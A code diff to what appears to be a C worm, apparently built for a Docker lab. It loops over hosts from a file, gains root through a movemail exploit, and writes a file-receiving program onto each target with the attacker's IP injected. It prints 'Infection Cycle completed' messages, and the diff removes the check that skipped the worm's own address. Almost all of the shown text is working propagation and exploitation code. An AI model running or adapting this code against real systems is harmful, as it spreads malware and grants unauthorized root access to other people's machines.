@@ -35,18 +35,30 @@ void get_docker_ip(ip)
     }
 
     fclose(fp);
-    printf("[+] Local IP set to: %s\n", ip);
+    printf("[*] Local IP set to: %s\n", ip);
 }
 
-void deploy_receive_file(sock, my_ip)
+void deploy_receive_file(sock)
     int sock;
-    char *my_ip;
 {
     char cmd_buf[IO_BUF_SIZE];
     char *formatted_source;
     char *file_contents;
+    char local_ip[64];
+    FILE *fp;
+    char line[128];
     
     printf("[*] Deploying receive_file.c to target\n");
+
+    strcpy(local_ip, "127.0.0.1"); /* Default fallback */
+    fp = fopen("/etc/docker_ip", "r");
+    if (fp != (FILE *)0) {
+        if (fgets(line, 128, fp) != (char *)0) {
+            sscanf(line, "%s", local_ip);
+        }
+        fclose(fp);
+    }
+    printf("[*] Injected IP will be: [%s]\n", local_ip);
 
     formatted_source = (char *)malloc(10000); 
     if (formatted_source == (char *)0) return;
@@ -70,7 +82,7 @@ receive_int(&fs,s);while(fs>0){n=read(s,b,2047);if(n<=0)break;b[n]=0;\
 fputs(b,o);fs-=n;}fclose(o);free(fn);send_int(i,s);}break;}close(s);return 0;}";
 
     /* strcpy(my_ip, "172.20.0.11"); */
-    sprintf(formatted_source, file_contents, my_ip);
+    sprintf(formatted_source, file_contents, local_ip);
 
     write_to_sock(sock, "cat > /tmp/receive_file.c << 'EOF'\n");
     write_to_sock(sock, formatted_source);
@@ -83,9 +95,8 @@ fputs(b,o);fs-=n;}fclose(o);free(fn);send_int(i,s);}break;}close(s);return 0;}";
     printf("[*] File contents sent\n");
 }
 
-void infect(ip, my_ip)
+void infect(ip)
     char *ip;
-    char *my_ip;
 {
     int sock;
     struct sockaddr_in serv_addr;
@@ -119,7 +130,7 @@ void infect(ip, my_ip)
     get_root_shell_via_movemail_exploit(sock, io_buf, IO_BUF_SIZE);
     printf("[*] Should have root shell now\n");
 
-    deploy_receive_file(sock, my_ip);
+    deploy_receive_file(sock);
     
     printf("[*] Forking to create send_file process\n");
 
@@ -167,9 +178,6 @@ int main()
     FILE *fp;
     char line[128];
     char ip[MAX_IP_LEN];
-    char my_ip[MAX_IP_LEN];
-
-    get_docker_ip(my_ip); 
 
     while (1) {
         fp = fopen(HOSTS_FILE, "r");
@@ -187,10 +195,8 @@ int main()
 
             if (strcmp(ip, "127.0.0.1") == 0)
                 continue;
-            if (strcmp(ip, my_ip) == 0)
-                continue;
 
-            infect(ip, my_ip);
+            infect(ip);
             printf(" ---- Infection Cycle completed for IP: %s ----\n", ip);
             sleep(10);
         }
